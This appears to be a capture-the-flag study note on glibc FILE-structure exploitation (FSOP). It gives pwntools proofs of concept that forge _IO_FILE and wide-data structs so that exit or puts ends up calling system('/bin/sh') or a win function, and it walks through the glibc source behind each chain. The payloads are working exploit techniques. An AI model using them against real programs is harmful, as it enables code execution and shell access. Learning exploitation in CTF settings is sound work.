## I. basic arb read/write
- `read` from a file to memory
- `write` memory out to file
-> overwrite buf pointers -> control where `read`/`write`
### a. arb write:
```D
flag = 0xFBAD1808 / 0xFBAD2488
read_ptr = read_base = 0
buf_base = addr to write
buf_end = addr to write + len
buf_end - buf_base >= num of bytes to read
fileno = 0
```
![[angelboy-1.png]]
### b. arb read:
```D
flag = 0xFBAD1804 / 0xFBAD1800
write_base = memory to write
write_ptr = addr to write + len
read_end = write_base
fileno = 1
```
![[angelboy-2.png]]
## II. advanced FSOP attack
- struct:
	```C
	pwndbg> p *_IO_list_all
	$1 = {
	  file = {
	    _flags = -72540026,
	    _IO_read_ptr = 0x0,
	    _IO_read_end = 0x0,
	    _IO_read_base = 0x0,
	    _IO_write_base = 0x0,
	    _IO_write_ptr = 0x0,
	    _IO_write_end = 0x0,
	    _IO_buf_base = 0x0,
	    _IO_buf_end = 0x0,
	    _IO_save_base = 0x0,
	    _IO_backup_base = 0x0,
	    _IO_save_end = 0x0,
	    _markers = 0x0,
	    _chain = 0x7ffff7e045c0 <_IO_2_1_stdout_>,
	    _fileno = 2,
	    _flags2 = 0,
	    _old_offset = -1,
	    _cur_column = 0,
	    _vtable_offset = 0 '\000',
	    _shortbuf = "",
	    _lock = 0x7ffff7e05700 <_IO_stdfile_2_lock>,
	    _offset = -1,
	    _codecvt = 0x0,
	    _wide_data = 0x7ffff7e036e0 <_IO_wide_data_2>,
	    _freeres_list = 0x0,
	    _freeres_buf = 0x0,
	    __pad5 = 0,
	    _mode = 0,
	    _unused2 = '\000' <repeats 19 times>
	  },
	  vtable = 0x7ffff7e02030 <_IO_file_jumps>
	}
	// TOTAL: 0xe0 bytes
	
	pwndbg> ptype /o struct _IO_FILE
	/* offset      |    size */  type = struct _IO_FILE {
	/*      0      |       4 */    int _flags;
	/* XXX  4-byte hole      */
	/*      8      |       8 */    char *_IO_read_ptr;
	/*     16      |       8 */    char *_IO_read_end;
	/*     24      |       8 */    char *_IO_read_base;
	/*     32      |       8 */    char *_IO_write_base;/
	/*     40      |       8 */    char *_IO_write_ptr;
	/*     48      |       8 */    char *_IO_write_end;
	/*     56      |       8 */    char *_IO_buf_base;
	/*     64      |       8 */    char *_IO_buf_end;
	/*     72      |       8 */    char *_IO_save_base;
	/*     80      |       8 */    char *_IO_backup_base;
	/*     88      |       8 */    char *_IO_save_end;
	/*     96      |       8 */    struct _IO_marker *_markers;
	/*    104      |       8 */    struct _IO_FILE *_chain;
	/*    112      |       4 */    int _fileno;
	/*    116      |       4 */    int _flags2;
	/*    120      |       8 */    __off_t _old_offset;
	/*    128      |       2 */    unsigned short _cur_column;
	/*    130      |       1 */    signed char _vtable_offset;
	/*    131      |       1 */    char _shortbuf[1];
	/* XXX  4-byte hole      */
	/*    136      |       8 */    _IO_lock_t *_lock;
	/*    144      |       8 */    __off64_t _offset;
	/*    152      |       8 */    struct _IO_codecvt *_codecvt;
	/*    160      |       8 */    struct _IO_wide_data *_wide_data;
	/*    168      |       8 */    struct _IO_FILE *_freeres_list;
	/*    176      |       8 */    void *_freeres_buf;
	/*    184      |       8 */    size_t __pad5;
	/*    192      |       4 */    int _mode;
	/*    196      |      20 */    char _unused2[20];
	
	                               /* total size (bytes):  216 */
	                             }
	
	pwndbg> p _IO_wide_data_2
	$2 = {
	  _IO_read_ptr = 0x0,
	  _IO_read_end = 0x0,
	  _IO_read_base = 0x0,
	  _IO_write_base = 0x0,
	  _IO_write_ptr = 0x0,
	  _IO_write_end = 0x0,
	  _IO_buf_base = 0x0,
	  _IO_buf_end = 0x0,
	  _IO_save_base = 0x0,
	  _IO_backup_base = 0x0,
	  _IO_save_end = 0x0,
	  _IO_state = {
	    __count = 0,
	    __value = {
	      __wch = 0,
	      __wchb = "\000\000\000"
	    }
	  },
	  _IO_last_state = {
	    __count = 0,
	    __value = {
	      __wch = 0,
	      __wchb = "\000\000\000"
	    }
	  },
	  _codecvt = {
	    __cd_in = {
	      step = 0x0,
	      step_data = {
	        __outbuf = 0x0,
	        __outbufend = 0x0,
	        __flags = 0,
	        __invocation_counter = 0,
	        __internal_use = 0,
	        __statep = 0x0,
	        __state = {
	          __count = 0,
	          __value = {
	            __wch = 0,
	            __wchb = "\000\000\000"
	          }
	        }
	      }
	    },
	    __cd_out = {
	      step = 0x0,
	      step_data = {
	        __outbuf = 0x0,
	        __outbufend = 0x0,
	        __flags = 0,
	        __invocation_counter = 0,
	        __internal_use = 0,
	        __statep = 0x0,
	        __state = {
	          __count = 0,
	          __value = {
	            __wch = 0,
	            __wchb = "\000\000\000"
	          }
	        }
	      }
	    }
	  },
	  _shortbuf = L"",
	  _wide_vtable = 0x7ffff7e02228 <_IO_wfile_jumps>
	}
	// TOTAL: 0xe8 bytes	
	
	pwndbg> ptype /o struct _IO_wide_data
	/* offset      |    size */  type = struct _IO_wide_data {
	/*      0      |       8 */    wchar_t *_IO_read_ptr;
	/*      8      |       8 */    wchar_t *_IO_read_end;
	/*     16      |       8 */    wchar_t *_IO_read_base;
	/*     24      |       8 */    wchar_t *_IO_write_base;
	/*     32      |       8 */    wchar_t *_IO_write_ptr;
	/*     40      |       8 */    wchar_t *_IO_write_end;
	/*     48      |       8 */    wchar_t *_IO_buf_base;
	/*     56      |       8 */    wchar_t *_IO_buf_end;
	/*     64      |       8 */    wchar_t *_IO_save_base;
	/*     72      |       8 */    wchar_t *_IO_backup_base;
	/*     80      |       8 */    wchar_t *_IO_save_end;
	/*     88      |       8 */    __mbstate_t _IO_state;
	/*     96      |       8 */    __mbstate_t _IO_last_state;
	/*    104      |     112 */    struct _IO_codecvt {
	/*    104      |      56 */        _IO_iconv_t __cd_in;
	/*    160      |      56 */        _IO_iconv_t __cd_out;
	
	                                   /* total size (bytes):  112 */
	                               } _codecvt;
	/*    216      |       4 */    wchar_t _shortbuf[1];
	/* XXX  4-byte hole      */
	/*    224      |       8 */    const struct _IO_jump_t *_wide_vtable;
	
	                               /* total size (bytes):  232 */
	                             }
	
	pwndbg> _IO_jump_t vtable
	struct _IO_jump_t
	{
	    JUMP_FIELD(size_t, __dummy);
	    JUMP_FIELD(size_t, __dummy2);
	    JUMP_FIELD(_IO_finish_t, __finish);
	    JUMP_FIELD(_IO_overflow_t, __overflow); /*  */
	    JUMP_FIELD(_IO_underflow_t, __underflow);
	    JUMP_FIELD(_IO_underflow_t, __uflow);
	    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
	    /* showmany */
	    JUMP_FIELD(_IO_xsputn_t, __xsputn);
	    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
	    JUMP_FIELD(_IO_seekoff_t, __seekoff);
	    JUMP_FIELD(_IO_seekpos_t, __seekpos);
	    JUMP_FIELD(_IO_setbuf_t, __setbuf);
	    JUMP_FIELD(_IO_sync_t, __sync);
	    JUMP_FIELD(_IO_doallocate_t, __doallocate);
	    JUMP_FIELD(_IO_read_t, __read);
	    JUMP_FIELD(_IO_write_t, __write);
	    JUMP_FIELD(_IO_seek_t, __seek);
	    JUMP_FIELD(_IO_close_t, __close);
	    JUMP_FIELD(_IO_stat_t, __stat);
	    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
	    JUMP_FIELD(_IO_imbue_t, __imbue);
	};
	```
### a. an3eii
- `_IO_wfile_underflow` -> `__libio_codecvt_in` -> `__cd_in.step->__fct`
- at least `0xE0` bytes
- ***note: padding `__pad5` of stdout to exactly `[stdout + 0x20]` for the exploit to work***
#### 1. PoC
```Python
system = libc.symbols['system']
add_rdi_0x10_jmp_rcx = libc.address + 0x000000000013b0d0
_IO_stdfile_1_lock = libc.symbols['_IO_stdfile_1_lock']
_IO_2_1_stdout_ = libc.symbols['_IO_2_1_stdout_']
fake_vtable = libc.symbols['_IO_wfile_jumps'] - 0x18

fake_stdout = [p64(0x3b01010101010101), # _flags
               p64(0),
               p64(system), # _IO_read_end
               p64(0) * 3,
               b"/bin/sh\x00", # _IO_write_end
               p64(0) * 2,
               p64(add_rdi_0x10_jmp_rcx), # _IO_save_base
               p64(0) * 7,
               p64(_IO_stdfile_1_lock), # _lock
               p64(0),
               p64(_IO_2_1_stdout_ + 0xb8), # _codecvt
               p64(_IO_2_1_stdout_ + 0x200), # _wide_data
               p64(0) * 2 + p64(_IO_2_1_stdout_ + 0x20) + p64(0) * 3, # padding the __pad5
               p64(fake_vtable) # vtable
               ]
payload = b"".join(fake_stdout)
s(payload)
```
#### 2. explanation
- in `_IO_wfile_underflow`, `__libio_codecvt_in` will be called:
	```C
	wint_t
	_IO_wfile_underflow (FILE *fp)
	{
	  struct _IO_codecvt *cd;
	  enum __codecvt_result status;
	  ssize_t count;
	
	  /* C99 requires EOF to be "sticky".  */
	  if (fp->_flags & _IO_EOF_SEEN)
	    return WEOF;
	
	  if (__glibc_unlikely (fp->_flags & _IO_NO_READS))
	    {
	      fp->_flags |= _IO_ERR_SEEN;
	      __set_errno (EBADF);
	      return WEOF;
	    }
	  if (fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end)
	    return *fp->_wide_data->_IO_read_ptr;
	
	  cd = fp->_codecvt;
	
	  /* Maybe there is something left in the external buffer.  */
	  if (fp->_IO_read_ptr < fp->_IO_read_end)
	    {
	      /* There is more in the external.  Convert it.  */
	      const char *read_stop = (const char *) fp->_IO_read_ptr;
	
	      fp->_wide_data->_IO_last_state = fp->_wide_data->_IO_state;
	      fp->_wide_data->_IO_read_base = fp->_wide_data->_IO_read_ptr =
		fp->_wide_data->_IO_buf_base;
	      status = __libio_codecvt_in (cd, &fp->_wide_data->_IO_state, // HERE
					   fp->_IO_read_ptr, fp->_IO_read_end,
					   &read_stop,
					   fp->_wide_data->_IO_read_ptr,
					   fp->_wide_data->_IO_buf_end,
					   &fp->_wide_data->_IO_read_end);
	
	      fp->_IO_read_base = fp->_IO_read_ptr;
	...
	}
	```
- inside it, there is `DL_CALL_FCT(fct, (gs, ..))` that calling `fct(gs, ..)`
  ```C
  # define DL_CALL_FCT(fctp, args) \
  (_dl_mcount_wrapper_check ((void *) (fctp)), (*(fctp)) args)
  
  enum __codecvt_result
	__libio_codecvt_in (struct _IO_codecvt *codecvt, __mbstate_t *statep,
			    const char *from_start, const char *from_end,
			    const char **from_stop,
			    wchar_t *to_start, wchar_t *to_end, wchar_t **to_stop)
	{
	  enum __codecvt_result result;
	
	  struct __gconv_step *gs = codecvt->__cd_in.__cd.__steps;     // HERE
	  int status;
	  size_t dummy;
	  const unsigned char *from_start_copy = (unsigned char *) from_start;
	
	  codecvt->__cd_in.__cd.__data[0].__outbuf = (unsigned char *) to_start;
	  codecvt->__cd_in.__cd.__data[0].__outbufend = (unsigned char *) to_end;
	  codecvt->__cd_in.__cd.__data[0].__statep = statep;
	
	  __gconv_fct fct = gs->__fct;                                 // HERE
	#ifdef PTR_DEMANGLE
	  if (gs->__shlib_handle != NULL)
	    PTR_DEMANGLE (fct);
	#endif
	
	  status = DL_CALL_FCT (fct,                                   // HERE
				(gs, codecvt->__cd_in.__cd.__data, &from_start_copy,
				 (const unsigned char *) from_end, NULL,
				 &dummy, 0, 0));
	...
	}
  ```
- `codecvt` pointer is `fake_stdout+0x20`, which points to `stdout + 0xb8`
- at `stdout+ 0xb8`, we set its value is `fake_stdout + 0x20`
- since `__steps` is at offset 0 of `codecvt`, `*gs = stdout+0x20`
- first, check out `__gconv_step` struct. `__fct` is at offset 0x28
	```C
	struct __gconv_step
	{
	  struct __gconv_loaded_object *__shlib_handle;
	  const char *__modname;
	
	  /* For internal use by glibc.  (Accesses to this member must occur
	     when the internal __gconv_lock mutex is acquired).  */
	  int __counter;
	
	  char *__from_name;
	  char *__to_name;
	
	  __gconv_fct __fct;                      // HERE
	  __gconv_btowc_fct __btowc_fct;
	  __gconv_init_fct __init_fct;
	  __gconv_end_fct __end_fct;
	
	  /* Information about the number of bytes needed or produced in this
	     step.  This helps optimizing the buffer sizes.  */
	  int __min_needed_from;
	  int __max_needed_from;
	  int __min_needed_to;
	  int __max_needed_to;
	
	  /* Flag whether this is a stateful encoding or not.  */
	  int __stateful;
	
	  void *__data;		/* Pointer to step-local data.  */
	};
	```
- `__gconv_fct fct = gs->__fct` will set fct to `[fake_stdout+0x20+0x28]` or gadget `add_rdi_jmp_rcx`
- bcoz `status = __libio_codecvt_in (cd, ..., fp->_IO_read_ptr, fp->_IO_read_end, ...)`, it will set `rcx` = `fp->_IO_read_end`, which is `fake_stdout + 0x10` = `system()`
- and in `status = DL_CALL_FCT (fct, (gs, ..., (const unsigned char *) from_end, ...))`, `gs` is the 1st arg of `fct`, so `rdi` = `[fake_stdout+0x20]` = `&codecvt`
- so when fct is called through `DL_CALL_FCT(fct, (gs, ..))`, gadget `add rdi, 0x10; jmp rcx` will set `rdi` = `[fake_stdout+0x30]` = `b"/bin/sh\x00"` and jump to `system()`!
### b. pwn_college
- ***reminder: `_lock` myst be a writable addr having NULL value (offset 0x50 usually satifies this)***
#### 1. win and leak
- `_IO_wfile_overflow` -> `_IO_wdoallocbuf` -> `_IO_WDOALLOCATE`
- get leaked `win` address, libc base, buf base, heap base,...
- first read to create fake vtable, second to overwrite FILE struct and trigger FSOP
##### 1.1. PoC
```Python
fakevtable  = p64(0) * (0xE0//8) + p64(buf_addr + 0xe0 + 8 - 0x68) + p64(win)
# fake_wide_vtable = fake_vtable._wide_vtable + 0x68 # __doallocate
fp = FileStructure()
fp.flags = 0xfbad2484
fp._lock = buf_addr + 0x1000 
fp._wide_data = buf_addr
fp._IO_write_ptr = 0x10
fp._IO_write_base = 0x0
fp.vtable = libc_base  + 0x1ce4a0 - 0x38 # _IO_wfile_jumps

s(fakevtable)
s(bytes(fp))
```
##### 1.2. explanation
- the call: `_IO_wfile_overflow` -> `_IO_wdoallocbuf` ->` _IO_WDOALLOCATE(fp)` -> `fp->_wide_data->_wide_vtable->__doallocate(fp)` 
  through several macros:
	``` C
		 #define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)
		 #define WJUMP0(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)->FUNC) (THIS)
		 #define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)
		 #define _IO_WIDE_JUMPS(THIS) _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)->_wide_vtable
	```
- after program exits (`exit`, `return`), it will call `_IO_flush_all_lockp` or `_IO_flush_all`, in which `fp->vtable->overflow` is called:
  ```C
	  int
	_IO_flush_all_lockp (int do_lock)
	{
	  int result = 0;
	  FILE *fp;
	
	#ifdef _IO_MTSAFE_IO
	  _IO_cleanup_region_start_noarg (flush_cleanup);
	  _IO_lock_lock (list_all_lock);
	#endif
	
	  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp->_chain)
	    {
	      run_fp = fp;
	      if (do_lock)
		_IO_flockfile (fp);
	
	      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
		   || (_IO_vtable_offset (fp) == 0
		       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
				    > 	fp->_wide_data->_IO_write_base))
		   )
		  && _IO_OVERFLOW (fp, EOF) == EOF) // HERE
		result = EOF;
	
	      if (do_lock)
		_IO_funlockfile (fp);
	      run_fp = NULL;
	    }
	
	#ifdef _IO_MTSAFE_IO
	  _IO_lock_unlock (list_all_lock);
	  _IO_cleanup_region_end (0);
	#endif
	
	  return result;
	}
  ```
- the reason to use this is bc `_IO_wfile_overflow` or `_IO_wfile_underflow` doesn't call `IO_validate_vtable` as `_IO_file_overflow` and `_IO_file_underflow`:
	```C
	# define _IO_JUMPS_FUNC(THIS) \
	  (IO_validate_vtable                                                   \
	   (*(struct _IO_jump_t **) ((void *) &_IO_JUMPS_FILE_plus (THIS)	\
				     + (THIS)->_vtable_offset)))
	```
- if we overwrite `vtable` to `_IO_wfile_overflow` instead of `_IO_file_overflow`, it will call `_IO_wfile_overflow`, which is our fake struct addr
- when it calls `fp->_wide_data->_wide_vtable->__doallocate(fp)`, now at offset 0x68 of `_wide_vtable` no longer locates `__doallocate(fp)` but `win()`
#### 2. no win or no buf leak
##### 2.1. PoC
- overwrite file struct in heap
```Python
system = libc.symbols['system']
fp = FileStructure()
fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
fp._IO_read_end = system
fp._IO_write_ptr = 0x10 # add if overwrite _chain 
fp._IO_write_base = 0x0
fp._lock = fileptr + 0x50
fp._wide_data = fileptr # fake FILE struct
fp.vtable = libc.symbols['_IO_wfile_jumps'] - 0x20
payload = bytes(fp) + p64(fileptr + 0x10 - 0x68)

s(payload)
```
- overwrite stdout in libc
```Python
_IO_2_1_stdout_ = libc.symbols['_IO_2_1_stdout_']
system = libc.symbols['system']
fp = FileStructure()
fp.flags = 0xfbad2484 + (u32(b"||sh") << 32) # can change to b";sh;" 
# or b" sh\x00\x00\x00\x00" if overwrite stdout on bss
fp._IO_read_end = system
fp._IO_write_ptr = 0x10
fp._IO_write_base = 0x0
fp._lock = _IO_2_1_stdout_ + 0x50
fp._wide_data = _IO_2_1_stdout_
fp.vtable = libc.symbols['_IO_wfile_jumps'] - 0x20
payload = bytes(fp) + p64(_IO_2_1_stdout_ + 0x10 - 0x68)

s(payload)
```
##### 2.2. explanation
- in this path, we wont use exit path to trigger, but output funcs like `puts`, `printf`, or `fwrite`..., which use `_IO_xsputn_t` instead of `_IO_overflow_t`
	```C
	int
	_IO_puts (const char *str)
	{
	  int result = EOF;
	  size_t len = strlen (str);
	  _IO_acquire_lock (stdout);
	
	  if ((_IO_vtable_offset (stdout) != 0
	       || _IO_fwide (stdout, -1) == -1)
	      && _IO_sputn (stdout, str, len) == len       // HERE
	      && _IO_putc_unlocked ('\n', stdout) != EOF)
	    result = MIN (INT_MAX, len + 1);
	
	  _IO_release_lock (stdout);
	  return result;
	}
	
	#define _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)
	#define _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)
	#define _IO_WXSPUTN(FP, DATA, N) WJUMP2 (__xsputn, FP, DATA, N)
	#define JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1, X2)
	#define WJUMP2(FUNC, THIS, X1, X2) (_IO_WIDE_JUMPS_FUNC(THIS)->FUNC) (THIS, X1, X2)
	```
- so to trigger `_IO_wdoallocbuf`, we have to set `vtable` = `_IO_wfile_jumps` - 0x20 (offset btw overflow and xsputn)
- when calling `_IO_WDOALLOCATE()`, there are two instructions in `_IO_wdoallocbuf`:
  ```Assembly
	mov    rax, qword ptr [rax + 0xe0]
	call   qword ptr [rax + 0x68]
  ```
- at that time, rax is holding `fileptr`/`_IO_2_1_stdout_`
- `[rax+0xe0]` is `p64(fileptr + 0x10 - 0x68)`, so `[rax+0x68]` will be `fileptr+0x10`, meaning we call `_IO_read_end` = `system`
- and `rdi` is pointing to `fileptr` or `flags` = `"||sh"`
- now we trigger `system("sh")`
### c. glibc 2.27 (fp->wide_data->wide_vtable at offset 0x130)
##### 3.1. PoC
```Python
system       = libc.sym["system"]
bin_sh       = next(libc.search(b"/bin/sh"))
stdout       = libc.sym["_IO_2_1_stdout_"]
stdin        = libc.sym["_IO_2_1_stdin_"]
stdfile_lock = libc.sym["_IO_stdfile_1_lock"]
wide_data    = libc.sym["_IO_wide_data_1"]
io_str_jumps = libc.sym["_IO_str_jumps"]

# fsop
fake  = p64(0xfbad2886) # original _flags & ~_IO_USER_BUF
fake += p64(stdout) * 4 # _IO_read_ptr to _IO_write_base
fake += p64((bin_sh - 100) // 2) # _IO_write_ptr // ## [ 1 ]
fake += p64(0) * 2 # _IO_write_end and _IO_buf_base // ## [ 2 ]
fake += p64((bin_sh - 100) // 2) # _IO_buf_end // ## [ 3 ]
fake += p64(0) * 4 # _IO_save_base to _markers
fake += p64(stdin) # _chain
fake += p32(1) # _fileno
fake += p32(0) # _flags2
fake += p64(0xffffffffffffffff) # _old_offset
fake += p16(0) # _cur_column
fake += p8(0) # _vtable_offset
fake += b'\n' # _shortbuf
fake += p32(0) # padding between shortbuf and _lock
fake += p64(stdfile_lock) # _lock
fake += p64(0xffffffffffffffff) # _offset
fake += p64(0) # _codecvt
fake += p64(wide_data) # _wide_data
fake += p64(0) # _freeres_list
fake += p64(0) #_freeres_buf
fake += p64(0) #__pad5
fake += p32(0xffffffff) # _mode
fake += b'\0'*20 # _unused2
fake += p64(io_str_jumps) # vtable // ## [ 4 ]
fake += p64(system) # _s._allocate_buffer // ## [ 5 ]
fake += p64(stdout) # _s._free_buffer
```
##### 3.2. explanation
- source code:
```C
_IO_size_t
_IO_default_xsputn (_IO_FILE *f, const void *data, _IO_size_t n)
{
  const char *s = (char *) data;
  _IO_size_t more = n;
  if (more <= 0)
    return 0;
  for (;;)
    {
      /* Space available. */
      if (f->_IO_write_ptr < f->_IO_write_end)
	{
	  _IO_size_t count = f->_IO_write_end - f->_IO_write_ptr;
	  if (count > more)
	    count = more;
	  if (count > 20)
	    {
	      f->_IO_write_ptr = __mempcpy (f->_IO_write_ptr, s, count);
	      s += count;
	    }
	  else if (count)
	    {
	      char *p = f->_IO_write_ptr;
	      _IO_ssize_t i;
	      for (i = count; --i >= 0; )
		*p++ = *s++;
	      f->_IO_write_ptr = p;
	    }
	  more -= count;
	}
      if (more == 0 || _IO_OVERFLOW (f, (unsigned char) *s++) == EOF)        // HERE
	break;
      more--;
    }
  return n - more;
}

int
_IO_str_overflow (_IO_FILE *fp, int c)
{
  int flush_only = c == EOF;
  _IO_size_t pos;
  if (fp->_flags & _IO_NO_WRITES)
      return flush_only ? 0 : EOF;
  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
    {
      fp->_flags |= _IO_CURRENTLY_PUTTING;
      fp->_IO_write_ptr = fp->_IO_read_ptr;
      fp->_IO_read_ptr = fp->_IO_read_end;
    }
  pos = fp->_IO_write_ptr - fp->_IO_write_base;
  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))                     // ## [ 1 ]
    {
      if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */           // ## [ 2 ]
	return EOF;
      else
	{
	  char *new_buf;
	  char *old_buf = fp->_IO_buf_base;
	  size_t old_blen = _IO_blen (fp);
	  _IO_size_t new_size = 2 * old_blen + 100;                             // ## [ 3 ]
	  if (new_size < old_blen)
	    return EOF;
	  new_buf
	    = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size); // ## [ 4 ]
	  ...
	}
}

#define _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base)

struct _IO_str_fields
{
  _IO_alloc_type _allocate_buffer;
  _IO_free_type _free_buffer;
};

struct _IO_streambuf
{
  struct _IO_FILE _f;
  const struct _IO_jump_t *vtable;
};

typedef struct _IO_strfile_
{
  struct _IO_streambuf _sbf;
  struct _IO_str_fields _s;
} _IO_strfile;
```
- `puts` calls `_IO_str_jumps`'s `vtable->xsputn` OR `_IO_default_xsputn`
- `_IO_str_overflow` is called in `_IO_default_xsputn()` instead of `_IO_overflow` as `vtable = _IO_str_jumps`
- our target is `_allocate_buffer`, overwrite it with `system`
- `_allocate_buffer` takes `new_size` as first arg -> `/bin/sh\x00` = (`_IO_buf_end - _IO_buf_base) / 2 + 100` -> `_IO_buf_end` = `(/bin/sh\x00 - 100) // 2` 
### d. limited payload
#### 1. win / ***basic fsop - dreamhack***
- like **pwn_college** path, but abuse `_chains` to set up fake FILE struct: `_IO_wfile_overflow` -> `_IO_wdoallocbuf` -> `_IO_WDOALLOCATE`
##### 1.1. PoC
```Python
win = exe.sym.win
stdout = libc.sym['_IO_2_1_stdout_']
wvtable = libc.sym['_IO_wfile_jumps']

fp = FileStructure()

fp.chain = stdout - 0x80    # mov to fake FILE struct
buf = stdout - 0xe0         # fake wide_data
fp._IO_read_ptr = 0x4040a0  # fake _lock
fp._IO_write_base = buf     # fake wide_data
fp._IO_save_end = wvtable   # fake_vtable

fp.markers = win            # fake wide_data->wide_vtable->doallocate
flags = stdout - 0x8        # fake wide_data->wide_vtable
payload = p64(flags)
payload += (bytes(fp))[0x8:0x70]

s(payload)
```
#### 2. no win / ***securinets ctf 2025***
- like **an3eii** path using add gadget, but here abuse `_chains` to set up fake FILE struct: `_IO_cleanup` -> `_IO_unbuffer_all` -> `_IO_new_file_setbuf` -> `_IO_default_setbuf` -> `_IO_new_file_sync` -> `_IO_do_flush` -> `_IO_wdo_write` -> `__libio_codecvt_out` -> `fct(gs)`
##### 2.1. PoC
```Python
stdout = libc.sym['_IO_2_1_stdout_']
system = libc.symbols['system']
_IO_stdfile_1_lock = libc.address + 0x1e97b0
add_gadget = libc.address + 0x001563c3 # add rdi, 0x10; jmp rcx;

payload = flat(
    {   
        0x00: 0xfbad2484,               # !(_IO_UNBUFFERED = 0x0002)
        0x08: 0,                        # codecvt->__cd_in / rdi
        0x18: b"/bin/sh\x00",           # rdi + 0x10
        0x20: system,                   # _IO_write_base / wide_data->write_ptr
        0x28: system + 0x10,            # _IO_write_ptr > _IO_write_base
        0x30: add_gadget,               # codecvt->__cd_out->.step->_fct
        0x40: stdout + 0x08,            # codecvt->__cd_out->step
        0x88: _IO_stdfile_1_lock,       # lock for stdout = 0
        0x98: stdout + 0x8,             # codecvt
        0xa0: stdout,                   # wide_data
        0xc0: 0x10                      # mode > 0
    }, filler=b'\0', length=0xd8)

s(payload)
```
##### 2.2. explanation
- source code:
	```C
	int
	_IO_cleanup (void)
	{
	  int result = _IO_flush_all ();
	  _IO_unbuffer_all ();                                      // HERE
	  return result;
	}
	
	static void
	_IO_unbuffer_all (void)
	{
	  FILE *fp;
	
	#ifdef _IO_MTSAFE_IO
	  _IO_cleanup_region_start_noarg (flush_cleanup);          // CONDITION
	  _IO_lock_lock (list_all_lock);
	#endif
	
	  for (fp = (FILE *) _IO_list_all; fp; fp = fp->_chain)
	    {
	      int legacy = 0;
	
	      run_fp = fp;
	      _IO_flockfile (fp);
	      ...
	      if (! (fp->_flags & _IO_UNBUFFERED)                  // CONDITION
		  && (legacy || fp->_mode != 0))
		{
		  ...
		  _IO_SETBUF (fp, NULL, 0);                            // HERE
		  ...
		}
		...
	}
	
	FILE *
	_IO_new_file_setbuf (FILE *fp, char *p, ssize_t len)
	{
	  if (_IO_default_setbuf (fp, p, len) == NULL)             // HERE
	    return NULL;
	  ...
	}
	
	FILE *
	_IO_default_setbuf (FILE *fp, char *p, ssize_t len)
	{
	    if (_IO_SYNC (fp) == EOF)                              // HERE
		return NULL;
		...
	}
	
	int
	_IO_new_file_sync (FILE *fp)
	{
	  ssize_t delta;
	  int retval = 0;
	
	  if (fp->_IO_write_ptr > fp->_IO_write_base)             // CONDITION
	    if (_IO_do_flush(fp)) return EOF;                     // HERE
	  ...
	}
	
	#define _IO_do_flush(_f) \
	  ((_f)->_mode <= 0							      \       // CONDITION
	   ? _IO_do_write(_f, (_f)->_IO_write_base, (_f)->_IO_write_ptr-(_f)->_IO_write_base)
	   : _IO_wdo_write(_f, (_f)->_wide_data->_IO_write_base,\ // HERE
			   ((_f)->_wide_data->_IO_write_ptr			    \
			    - (_f)->_wide_data->_IO_write_base)))
	
	int
	_IO_wdo_write (FILE *fp, const wchar_t *data, size_t to_do)
	{
	  struct _IO_codecvt *cc = fp->_codecvt;
	
	  if (to_do > 0)
	    {
	      if (fp->_IO_write_end == fp->_IO_write_ptr
		  && fp->_IO_write_end != fp->_IO_write_base)
		{
		  if (_IO_new_do_write (fp, fp->_IO_write_base,
					fp->_IO_write_ptr - fp->_IO_write_base) == EOF)
		    return WEOF;
		}
	
	      do
		{
		  enum __codecvt_result result;
		  const wchar_t *new_data;
		  char mb_buf[MB_LEN_MAX];
		  char *write_base, *write_ptr, *buf_end;
		  ...
		  /* Now convert from the internal format into the external buffer.  */
		  result = __libio_codecvt_out (cc,                   // HERE, rdi
		                &fp->_wide_data->_IO_state, data,
		                data + to_do,                        // HERE, rcx
						&new_data, write_ptr, buf_end, &write_ptr);
		  ...
		}
	  ...
	}
	
	enum __codecvt_result
	__libio_codecvt_out (struct _IO_codecvt *codecvt, __mbstate_t *statep,
			     const wchar_t *from_start, const wchar_t *from_end,
			     const wchar_t **from_stop, char *to_start, char *to_end,
			     char **to_stop)
	{
	  enum __codecvt_result result;
	  struct __gconv_step *gs = codecvt->__cd_out.step;       // HERE, rdi - 0x10
	  ...
	  __gconv_fct fct = gs->__fct;                            // HERE, add gadget
	  if (gs->__shlib_handle != NULL)                         // CONDITION
	    PTR_DEMANGLE (fct);
	
	  status = DL_CALL_FCT (fct,
				(gs, &codecvt->__cd_out.step_data, &from_start_copy,
				 (const unsigned char *) from_end, NULL,
				 &dummy, 0, 0));
	  ...
	}
	
	```
- `codecvt` = `codecvt->__cd_in` = `[stdout + 0x98]` = stdout + 0x8  = rdi
- `[stdout + 0x8 + 0x10]` = `[stdout + 0x18]` = rdi + 0x10 = binsh
- `[stdout + 0x20]` = `wide_data->_IO_write_ptr` = rcx = system
- `codecvt->__cd_out` = `codecvt->__cd_out.step` = `[stdout + 0x8 + 0x38]` = `[stdout + 0x40]` = stdout + 0x8
- `codecvt->__cd_out->.step->_fct` = `[stdout + 0x8 + 0x28]` = `[stdout + 0x30]` = add_gadget
- `[stdout + 0xa0]` = `wide_data` = stdout
## III. stdin buffer expansion / ***glacier ctf 2023***
- use this when u can have libc leak + write arb limited payload (1-8 bytes) to anywhere
- modify the `_IO_buf_end` entry of `stdin` so that we can write up to `stdout`
## IV. stdout 0.5 / ***shop - cyberspace ctf 2024***
- abuse libc addr - `main_arena` - leftover on heap (after unsorted bin, ...), modify 2 LSB to `stdout`
